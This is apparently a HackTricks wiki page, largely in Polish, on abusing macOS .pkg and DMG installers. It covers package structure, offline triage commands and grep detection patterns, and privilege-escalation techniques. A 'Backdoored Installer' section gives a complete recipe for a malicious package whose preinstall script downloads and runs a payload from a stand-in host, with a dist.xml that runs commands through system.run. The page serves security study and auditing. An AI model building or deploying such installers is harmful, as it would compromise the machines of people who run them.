# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje o Pkg

Pakiet instalacyjny macOS (**installer package**) (znany też jako plik `.pkg`) to format pliku używany przez macOS do **dystrybucji oprogramowania**. Te pliki są jak **pudełko zawierające wszystko, czego kawałek oprogramowania** potrzebuje, aby poprawnie się zainstalować i uruchomić.

Sam plik pakietu jest archiwum, które przechowuje **hierarchię plików i katalogów, które zostaną zainstalowane na docelowym** komputerze. Może też zawierać **skrypty** do wykonywania zadań przed i po instalacji, takich jak konfiguracja plików konfiguracyjnych albo usuwanie starych wersji oprogramowania.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Dostosowania (tytuł, tekst powitalny…) oraz sprawdzenia skryptów/instalacji
- **PackageInfo (xml)**: Informacje, wymagania instalacyjne, lokalizacja instalacji, ścieżki do skryptów do uruchomienia
- **Bill of materials (bom)**: Lista plików do zainstalowania, zaktualizowania lub usunięcia wraz z uprawnieniami plików
- **Payload (CPIO archive gzip compressed)**: Pliki do zainstalowania w `install-location` z PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Skrypty przed i po instalacji oraz inne zasoby wyodrębniane do katalogu tymczasowego w celu wykonania.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Aby zwizualizować zawartość instalatora bez ręcznego dekompresowania, możesz także użyć darmowego narzędzia [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Jeśli celem jest analiza, spróbuj **unikać otwierania pakietu najpierw za pomocą `Installer.app`**. Niektóre pakiety mogą wykonywać kod w momencie, gdy Installer je otwiera (na przykład przez `system.run()` lub installer plug-ins), więc ekstrakcja offline jest zwykle bezpieczniejszym punktem startowym.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Podstawowe informacje o DMG

Pliki DMG, czyli Apple Disk Images, to format plików używany przez Apple macOS do obrazów dysków. Plik DMG jest w zasadzie **montowalnym obrazem dysku** (zawiera własny filesystem), który zawiera surowe dane blokowe, zwykle skompresowane, a czasem zaszyfrowane. Gdy otwierasz plik DMG, macOS **montuje go tak, jakby był fizycznym dyskiem**, co pozwala uzyskać dostęp do jego zawartości.

> [!CAUTION]
> Zwróć uwagę, że instalatory **`.dmg`** obsługują **tak wiele formatów**, że w przeszłości niektóre z nich zawierające vulnerabilities były abused do uzyskania **kernel code execution**.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchia pliku DMG może się różnić w zależności od zawartości. Jednak w przypadku DMG z aplikacjami zwykle wygląda to tak:

- Top Level: To jest root obrazu dysku. Często zawiera aplikację oraz ewentualnie link do folderu Applications.
- Application (.app): To jest właściwa aplikacja. W macOS aplikacja jest zwykle pakietem zawierającym wiele pojedynczych plików i folderów, które tworzą aplikację.
- Applications Link: To jest shortcut do folderu Applications w macOS. Jego celem jest ułatwienie instalacji aplikacji. Możesz przeciągnąć plik .app na ten shortcut, aby zainstalować app.

## Privesc via pkg abuse

### Execution from public directories

Jeśli skrypt pre lub post installation na przykład wykonuje się z **`/var/tmp/Installerutil`**, a attacker może kontrolować ten skrypt, może eskalować privileges za każdym razem, gdy zostanie uruchomiony. Albo inny podobny przykład:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

To jest [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), którą kilka instalatorów i updaterów wywołuje, aby **execute something as root**. Ta funkcja przyjmuje jako parametr **path** do **file** przeznaczonego do **execute**; jednak jeśli attacker może **modify** ten plik, będzie w stanie **abuse** jego wykonania z uprawnieniami root, aby **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Nadużywanie environment i shebang

Współczesne błędy PackageKit pokazały, że skrypty instalacyjne są często wykonywane jako **zaufany kod root** przy jednoczesnym zachowaniu w pobliżu kontekstu kontrolowanego przez atakującego. Podczas audytu pakietów vendor zwracaj szczególną uwagę na:

- Interpretery shell, takie jak `#!/bin/zsh` / `#!/bin/bash`
- Wywołania typu `sudo -u $USER`, `launchctl asuser` lub jakąkolwiek logikę, która ufa `$USER`, `$HOME`, `PATH`, `TMPDIR` albo ścieżkom względnym
- Interpretery inne niż shell, które mogą ładować kontrolowane przez użytkownika pliki init lub biblioteki
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Dla błędu PackageKit z 2024 roku w środowisku root (`~/.zshenv` / dziedziczenie `~/.bash*` podczas instalacji inicjowanej przez użytkownika), sprawdź [generic macOS privesc page](../macos-privilege-escalation.md). Jeśli pakiet jest **Apple-signed**, ten sam bug ze skryptem może stać się istotny dla **SIP/TCC**, ponieważ `system_installd` może dziedziczyć `com.apple.rootless.install.heritable`; zobacz [SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

Jeśli instalator zapisuje do `/tmp/fixedname/bla/bla`, możliwe jest **utworzenie montowania** nad `/tmp/fixedname` z `noowners`, dzięki czemu można **modyfikować dowolny plik podczas instalacji** i nadużyć procesu instalacji.

Przykładem jest **CVE-2021-26089**, które umożliwiło **nadpisanie okresowego skryptu** i uzyskanie wykonania jako root. Po więcej informacji zobacz prelekcję: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg jako malware

### Empty Payload

Można po prostu wygenerować plik **`.pkg`** z **pre i post-install scripts** bez żadnego rzeczywistego payload poza malware wewnątrz skryptów.

### JS in Distribution xml

Można dodać tagi **`<script>`** w pliku **distribution xml** pakietu i ten kod zostanie wykonany, a także może **wykonywać komendy** przy użyciu **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

W pakietach distribution zwykle zależy to od tego, czy plik najwyższego poziomu `Distribution` włącza zewnętrzne skrypty, na przykład przez `allow-external-scripts="true"`. Dlatego samo sprawdzanie `preinstall` / `postinstall` nie wystarcza: sam **Distribution XML** może zawierać hooki `installation-check` / `volume-check` oraz bezpośrednie ścieżki wykonania `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Złośliwy instalator używający skryptu i kodu JS wewnątrz dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
